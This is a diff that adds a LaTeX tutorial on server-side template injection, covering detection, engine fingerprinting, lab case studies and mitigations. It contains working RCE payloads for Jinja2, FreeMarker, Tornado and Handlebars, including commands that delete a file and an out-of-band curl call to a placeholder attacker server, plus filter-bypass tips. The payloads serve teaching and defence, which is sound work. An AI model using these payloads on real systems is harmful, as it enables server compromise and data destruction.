@@ -1,0 +1,430 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
+\usepackage{fancyhdr}
+
+% Configure listings for code highlighting
+\lstset{
+    numbers=none, 
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!5},
+    keywordstyle=\color{blue},
+    commentstyle=\color{green!50!black},
+    stringstyle=\color{red},
+    showstringspaces=false
+}
+
+% Define custom colors
+\definecolor{note}{RGB}{50,150,200}
+\definecolor{warning}{RGB}{200,100,50}
+\definecolor{danger}{RGB}{200,50,50}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=cyan,
+    pdftitle={SSTI Notes},
+    pdfpagemode=FullScreen,
+}
+
+% Create custom tcolorbox environments
+\newtcolorbox{infobox}[1][]{colback=note!5,colframe=note!75!black,title=#1}
+\newtcolorbox{warningbox}[1][]{colback=warning!5,colframe=warning!75!black,title=#1}
+\newtcolorbox{dangerbox}[1][]{colback=danger!5,colframe=danger!75!black,title=#1}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{SSTI Notes: Server-Side Template Injection}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+\maketitle
+
+
+\section{Introduction to Template Engines}
+
+\subsection{What are Template Engines?}
+Template engines are software components that separate the presentation layer from the application logic. They allow developers to embed dynamic content into static HTML templates, making web development more efficient and maintainable.
+
+\begin{infobox}[Key Concept]
+Template engines work by taking a template file (containing placeholders) and merging it with data to produce the final HTML output sent to the client.
+\end{infobox}
+
+\subsection{How Template Engines Work}
+The basic workflow of a template engine involves:
+\begin{enumerate}
+    \item Loading a template file with special syntax (e.g., \{\{ variable \}\}, \%\% code \%\%)
+    \item Receiving data from the application (user input, database results)
+    \item Processing the template by replacing placeholders with actual data
+    \item Rendering the final HTML page to the user
+\end{enumerate}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{@{} l l l @{}}
+\toprule
+\textbf{Language} & \textbf{Template Engine} & \textbf{Syntax Example} \\
+\midrule
+Python & Jinja2 & \texttt{\{\{ variable \}\}} \\
+PHP & Twig & \texttt{\{\{ variable \}\}} \\
+Node.js & EJS & \texttt{<\%= variable \%>} \\
+\bottomrule
+\end{tabular}
+\caption{Popular Template Engines}
+\end{table}
+\subsection{Why Templates are Powerful but Risky}
+While template engines provide powerful features like:
+\begin{itemize}
+    \item Template inheritance and reuse
+    \item Built-in filters and functions
+    \item Conditional statements and loops
+    \item Automatic escaping (when configured correctly)
+\end{itemize}
+
+They also introduce security risks when user input is improperly handled.
+
+\section{Understanding SSTI}
+
+\subsection{What is Server-Side Template Injection?}
+Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded into templates in an unsafe manner. Attackers can inject malicious template code that gets executed on the server, potentially leading to:
+\begin{itemize}
+    \item Remote Code Execution (RCE)
+    \item Information disclosure
+    \item Server compromise
+    \item Data exfiltration
+\end{itemize}
+
+\subsection{How SSTI Happens}
+\begin{lstlisting}[language=Python, caption=Vulnerable Code Example]
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/hello')
+def hello():
+    name = request.args.get('name', 'Guest')
+    # VULNERABLE: Direct string concatenation
+    template = f"<h1>Hello {name}!</h1>"
+    return render_template_string(template)
+\end{lstlisting}
+
+In this example, if an attacker provides a malicious payload like \texttt{\{\{config\}\}}, it will be evaluated by Jinja2, exposing sensitive configuration data.
+
+\subsection{Detection of SSTI}
+
+\subsubsection{Basic Detection Payloads}
+\begin{lstlisting}[language=Python, caption=Common Detection Vectors]
+# Mathematical operations
+{{7*7}} or ${7*7} or <%= 7*7 %>
+
+# String concatenation
+{{'a'.upper()}} or ${'a'.toUpperCase()}
+
+# Accessing environment
+{{config}} or {{self}} or ${.version}
+\end{lstlisting}
+
+\subsection{Types of Template Engines}
+Based on the detection results, you can identify the template engine:
+
+\begin{itemize}
+    \item \textbf{Jinja2/Twig:} \{\{7*7\}\} = 49, \{\{'a'.upper()\}\} = 'A'
+    \item \textbf{Freemarker:} \$\{7*7\} = 49, can access Java classes
+    \item \textbf{Smarty:} \{\$smarty.version\} shows version
+    \item \textbf{EJS:} <\%= 7*7 \%> = 49
+    \item \textbf{Pug:} \#\{7*7\} = 49
+\end{itemize}
+
+\section{Exploitation Techniques}
+
+\subsection{Information Disclosure}
+\begin{lstlisting}[language=Python, caption=Jinja2 Information Disclosure]
+# List all global functions
+{{self.__init__.__globals__}}
+
+# Get configuration
+{{config}}
+
+# Get request object
+{{request}}
+
+# List classes
+{{''.__class__.__mro__}}
+\end{lstlisting}
+
+\subsection{Remote Code Execution}
+
+\subsubsection{Jinja2 RCE}
+\begin{lstlisting}[language=Python, caption=Jinja2 RCE Payloads]
+# Using subprocess (Python)
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Find subprocess.Popen
+{% for c in [].__class__.__base__.__subclasses__() %}
+  {% if c.__name__ == 'Popen' %}
+    {{c('whoami', shell=True, stdout=-1).communicate()}}
+  {% endif %}
+{% endfor %}
+
+# Simplified RCE
+{{self.__init__.__globals__.__builtins__.exec('import os; os.system("whoami")')}}
+\end{lstlisting}
+
+\subsubsection{Freemarker RCE}
+\begin{lstlisting}[language=Java, caption=Freemarker RCE]
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("id")}
+
+${"freemarker.template.utility.Execute"?new()("id")}
+\end{lstlisting}
+
+\subsection{Bypassing Filters}
+\begin{infobox}[Filter Bypass Techniques]
+When certain characters are filtered, try:
+\begin{itemize}
+    \item Using alternative syntax: \{\% if ... \%\} instead of \{\{...\}\}
+    \item String concatenation: \{\{'co'+'nfig'\}\}
+    \item Using ASCII/Unicode escapes: \{\{config['\_\_class\_\_']\}\}
+    \item Using request parameters: \{\{request.args.class\}\}
+    \item Using encoding 
+\end{itemize}
+\end{infobox}
+
+\section{Where to Find SSTI}
+SSTI is typically found wherever user input is reflected in a page and processed by a server-side engine. Common locations include:
+
+\begin{itemize}
+    \item \textbf{Profile Customization:} Usernames, bios, or custom "display names" that allow limited HTML/formatting.
+    \item \textbf{Email Templates:} Forgot password emails, newsletters, or receipts where the user's name is dynamically inserted.
+    \item \textbf{Error Pages:} Custom 404 or 500 error pages that reflect the URL or a specific parameter that caused the error.
+    \item \textbf{Document Generators:} Tools that convert HTML to PDF (e.g., invoices) often use template engines under the hood.
+    \item \textbf{CMS \& Blog Platforms:} Themes or plugins that allow "shortcodes" or custom template editing.
+\end{itemize}
+
+\section{How to Find SSTI: Methodology}
+
+\subsection{Phase 1: Detection (The Polyglot)}
+To check if a field is even being interpreted as a template, inject a polyglot string containing common engine delimiters. If the server throws an error or the output is missing, it suggests the engine tried (and failed) to parse your input.
+
+\begin{lstlisting}[caption=Universal Detection Polyglot]
+${{<%[%'"}}%\
+\end{lstlisting}
+
+If the server throws an error or the characters disappear/render differently, the application might be vulnerable.
+
+\subsection{Phase 2: Mathematical Evaluation}
+Inject simple mathematical expressions to see if the server evaluates them. Use different syntaxes to see which one works:
+\begin{itemize}
+    \item \texttt{\{\{7*7\}\}} $\rightarrow$ Look for \textbf{49}
+    \item \texttt{\$\{7*7\}} $\rightarrow$ Look for \textbf{49}
+    \item \texttt{<\%= 7*7 \%>} $\rightarrow$ Look for \textbf{49}
+\end{itemize}
+
+\subsection{Phase 3: Error-Based Fingerprinting}
+If the application has "Debug Mode" enabled or fails to catch exceptions, the specific error message returned can reveal the underlying language or engine:
+
+\begin{table}[h]
+\centering
+\small
+\begin{tabular}{@{} l l @{}}
+\toprule
+\textbf{Error Message Content} & \textbf{Likely Language / Engine} \\
+\midrule
+\texttt{ZeroDivisionError} & Python (Jinja2/Mako) \\
+\texttt{java.lang.ArithmeticException} & Java (Thymeleaf/Spring) \\
+\texttt{ReferenceError} or \texttt{TypeError} & Node.js (EJS/Pug) \\
+\texttt{Division by zero} or \texttt{DivisionByZeroError} & PHP (Twig/Smarty) \\
+\texttt{divided by 0} & Ruby (ERB) \\
+\texttt{Arithmetic operation failed} & Freemarker (Java) \\
+\bottomrule
+\end{tabular}
+\caption{Fingerprinting via Verbose Error Messages}
+\end{table}
+
+\begin{infobox}[Pro Tip]
+When testing your polyglot \texttt{\$\{\{<\%[\%'"\}\}\%\textbackslash}, pay close attention to the stack trace. A reference to a specific file path (e.g., \texttt{/usr/local/lib/python3.x/...}) is a "smoking gun" for the environment type.
+\end{infobox}
+
+\section{Advanced Discovery: Blind Techniques}
+
+\subsection{Blind SSTI Detection}
+When there is no output and no error message, use the following methods:
+
+\subsubsection{Time-Based Payloads}
+Force the server to "sleep" for a specific duration. If the response takes 10 seconds longer than usual, you have confirmed injection.
+\begin{itemize}
+    \item \textbf{Jinja2:} \texttt{\{\{ self.\_\_init\_\_.\_\_globals\_\_.\_\_builtins\_\_.import('time').sleep(10) \}\}}
+    \item \texttt{Ruby (ERB):} \texttt{<\%= sleep(10) \%>}
+\end{itemize}
+
+\subsubsection{Out-of-Band (OAST)}
+Force the server to make an external request to a server you control (like Burp Collaborator or Interactsh).
+\begin{itemize}
+    \item \textbf{Java (FreeMarker):} \texttt{\$\{ "freemarker.template.utility.Execute"?new()("curl http://YOUR-SERVER.com") \}}
+\end{itemize}
+
+\begin{dangerbox}[Warning]
+Blind SSTI is significantly harder to confirm. Always establish a "baseline" response time before testing time-based payloads to avoid false positives.
+\end{dangerbox}
+
+\section{Essential Resources}
+For a comprehensive and regularly updated list of payloads, bypasses, and engine-specific techniques, refer to the following repository:
+
+\begin{infobox}[Top Recommendation]
+\textbf{PayloadsAllTheThings - SSTI Guide} \\
+The most complete collection of SSTI payloads for every known template engine. \\
+\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection}{Click here to visit the GitHub Repository}
+\end{infobox}
+
+\subsection*{Why this is important to read:}
+\begin{itemize}
+    \item \textbf{Continuous Updates:} New bypasses for modern versions of Jinja2, Twig, and Java engines are added frequently.
+    \item \textbf{Comprehensive Bypasses:} It includes techniques for environments where common characters like \texttt{.}, \texttt{\_}, or \texttt{[]} are blocked.
+    \item \textbf{Filter Evasion:} Dedicated sections for WAF/Filter bypasses using alternative syntax.
+\end{itemize}
+
+\section{Practical Case Study: Tornado Injection}
+
+\subsection{Scenario: Parameter-to-Template Injection}
+In this scenario, a POST parameter \texttt{blog-post-author-display} is used by the server to determine which attribute of the \texttt{user} object to display (e.g., \texttt{user.name} or \texttt{user.nickname}).
+
+\begin{warningbox}[The Vulnerability]
+The server takes the string value of the parameter and dynamically places it inside a template:
+\texttt{render\_string("Hello \{\{ " + params['blog-post-author-display'] + " \}\}")}
+\end{warningbox}
+
+\subsection{Exploitation Steps}
+
+\subsubsection{1. Breaking the Context}
+Since the input is already inside an existing \texttt{\{\{ \}\}} block, we must first "break out" of the statement:
+\begin{itemize}
+    \item \textbf{Payload:} \texttt{user.name\}\}\{\{7*7\}\}}
+    \item \textbf{Result:} If the page displays \texttt{Peter49\}\}}, the engine is evaluating our injected math.
+\end{itemize}
+
+\subsubsection{2. Executing Arbitrary Python}
+Tornado allows the execution of arbitrary Python code using the \texttt{\{\% ... \%\}} syntax. To achieve RCE, we can import the \texttt{os} module.
+
+\begin{lstlisting}[language=Python, caption=Tornado RCE Payload]
+# Logical Payload
+{% import os %}{{ os.system('rm /home/carlos/morale.txt') }}
+
+# URL-Encoded Version for Burp Suite
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+\end{lstlisting}
+
+\subsection{Key Takeaways from this Lab}
+\begin{itemize}
+    \item \textbf{Identify the Context:} Always check if your input is already being wrapped in delimiters like \texttt{\{\{ \}\}}. If so, use \texttt{\}\}} to close the original statement before starting yours.
+    \item \textbf{Documentation is Key:} Every engine has a specific way of executing code. In Tornado, \texttt{\{\% \%\}} is the standard for statement execution.
+    \item \textbf{URL Encoding:} When sending payloads through tools like Burp Suite, ensure special characters (like \texttt{\%}, \texttt{ }, and \texttt{\&}) are properly URL-encoded to avoid breaking the HTTP request.
+\end{itemize}
+
+\section{Advanced Case Studies}
+
+\subsection{Case Study: FreeMarker (Java) - Exploiting Built-ins}
+In some applications, users are allowed to edit the template itself (e.g., product description templates). This is a direct path to SSTI.
+
+\begin{enumerate}
+    \item \textbf{Detection:} Change a variable to something non-existent like \texttt{\$\{foobar\}}.
+    \item \textbf{Fingerprinting:} The resulting error message explicitly mentions \texttt{freemarker.core.InvalidReferenceException}.
+    \item \textbf{Vulnerability:} FreeMarker has a \texttt{new()} built-in that can instantiate arbitrary Java classes.
+    \item \textbf{Exploit:} Use the \texttt{Execute} class to run OS commands.
+\end{enumerate}
+
+\begin{lstlisting}[language=Java, caption=FreeMarker RCE Payload]
+<#assign ex="freemarker.template.utility.Execute"?new()> 
+${ ex("rm /home/carlos/morale.txt") }
+\end{lstlisting}
+
+\subsection{Case Study: Handlebars (Node.js) - Prototype Pollution/Logic Bypass}
+This case study involves a GET request where a \texttt{message} parameter is rendered on the home page.
+
+\begin{enumerate}
+    \item \textbf{Detection:} Injecting the polyglot \texttt{\$\{\{<\%[\%'"\}\}\%\textbackslash} triggers a Handlebars-specific error.
+    \item \textbf{Identification:} Handlebars is often used in Node.js environments. Unlike Jinja2, it is logic-less by design, making exploitation much harder.
+    \item \textbf{Exploit Strategy:} Exploitation requires bypassing the sandbox by accessing the \texttt{constructor} through object helpers like \texttt{\#with}. 
+\end{enumerate}
+
+\begin{lstlisting}[caption=Handlebars RCE Logic (Simplified)]
+wrtz{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{#with string.split as |codelist|}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+\end{lstlisting}
+
+\begin{infobox}[Key Takeaway]
+Even "logic-less" template engines like Handlebars can be exploited if an attacker can traverse the object tree to reach the Function constructor or high-level modules like \texttt{child\_process}.
+\end{infobox}
+
+
+\section{Prevention and Mitigation}
+
+The root cause of SSTI is the blurring of the line between \textbf{data} and \textbf{code}. To secure an application, developers must ensure that user input is only ever treated as a literal string.
+
+\subsection{Primary Defense: Logic-Data Separation}
+The most effective defense is to never allow user input to be concatenated into a template string. Instead, use the engine's built-in mechanism for passing variables into the template context.
+
+\begin{lstlisting}[language=Python, caption=Secure vs Vulnerable Implementation]
+# VULNERABLE (Concatenation)
+template = "<html><h1>Hello " + user_input + "</h1></html>"
+return render_template_string(template)
+
+# SECURE (Context Injection)
+template = "<html><h1>Hello {{ name }}</h1></html>"
+return render_template_string(template, name=user_input)
+\end{lstlisting}
+
+\subsection{Secondary Defense: Sandboxing}
+If your application's core logic \textit{requires} users to provide custom templates (e.g., a CMS or email builder), you must use a strictly sandboxed environment.
+
+\begin{itemize}
+    \item \textbf{Remove Dangerous Built-ins:} Disable functions like \texttt{new()}, \texttt{import}, or \texttt{eval}.
+    \item \textbf{Restrict Attribute Access:} Use a whitelist to allow access only to specific, safe objects.
+    \item \textbf{Resource Limits:} Implement timeouts and memory limits to prevent Denial of Service (DoS) via infinite loops (e.g., \texttt{\{\{ 9999999**9999999 \}\}}).
+\end{itemize}
+
+\subsection{Environment Hardening}
+
+
+\begin{enumerate}
+    \item \textbf{Use "Logic-less" Engines:} Where possible, use engines like \textbf{Mustache} or \textbf{Handlebars} (configured securely). These are harder to exploit than "feature-rich" engines like Jinja2 or Freemarker.
+    \item \textbf{Read-Only File Systems:} Run the application in a container (Docker) with a read-only root filesystem. This prevents an attacker from using SSTI to write web shells or delete critical system files.
+    \item \textbf{Least Privilege:} The web server process should never run as \texttt{root} or \texttt{Administrator}.
+\end{enumerate}
+
+
+
+\begin{infobox}[Golden Rule]
+Treat all user input as malicious. If that input must appear in a template, it should be passed as a \textbf{parameter}, never as part of the \textbf{template's source code}.
+\end{infobox}
+
+
+
+
+
+\end{document}
